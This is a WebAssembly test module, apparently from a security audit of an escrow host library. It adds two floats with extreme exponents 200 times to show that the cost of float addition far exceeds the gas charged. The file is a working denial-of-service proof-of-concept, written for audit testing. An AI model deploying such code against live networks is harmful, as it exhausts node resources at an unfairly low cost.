;; D1 boundary_float — builds two floats whose exponents are far apart
;; (32767 and -32768) and adds them 200 times, forcing the mantissa-alignment
;; loop in Number::operator+= to iterate up to 32768 times per add. Per audit
;; finding 3.10: wall time is far larger than the gas charged.
;;
;; Category:  boundary_float   Lifecycle: finish_removes   Gas: 50000
;; Expected EscrowFinish result: tesSUCCESS.
;;
;; float regions are 12 bytes. float_from_mant_exp(mant, exp, out_ptr, out_len,
;;   mode). float_add(x_ptr, x_len, y_ptr, y_len, out_ptr, out_len, mode).
;; DoS signal: compare WASM_TIMING_FINISH time= against gas= for this category
;; vs the others.
(module
  (import "host_lib" "float_from_mant_exp"
    (func $ffme (param i64 i32 i32 i32 i32) (result i32)))
  (import "host_lib" "float_add"
    (func $fadd (param i32 i32 i32 i32 i32 i32 i32) (result i32)))
  (memory (export "memory") 1)
  (func (export "escrow_finish") (result i32)
    (local $i i32)
    ;; A = mantissa 1, exponent 32767  -> memory[0..12]
    (drop (call $ffme (i64.const 1) (i32.const 32767)
                      (i32.const 0) (i32.const 12) (i32.const 0)))
    ;; B = mantissa 1, exponent -32768 -> memory[12..24]
    (drop (call $ffme (i64.const 1) (i32.const -32768)
                      (i32.const 12) (i32.const 12) (i32.const 0)))
    (loop $L
      (drop (call $fadd
        (i32.const 0)  (i32.const 12)   ;; x
        (i32.const 12) (i32.const 12)   ;; y
        (i32.const 24) (i32.const 12)   ;; out
        (i32.const 0)))                 ;; mode
      (local.set $i (i32.add (local.get $i) (i32.const 1)))
      (br_if $L (i32.lt_s (local.get $i) (i32.const 200))))
    (i32.const 1)))
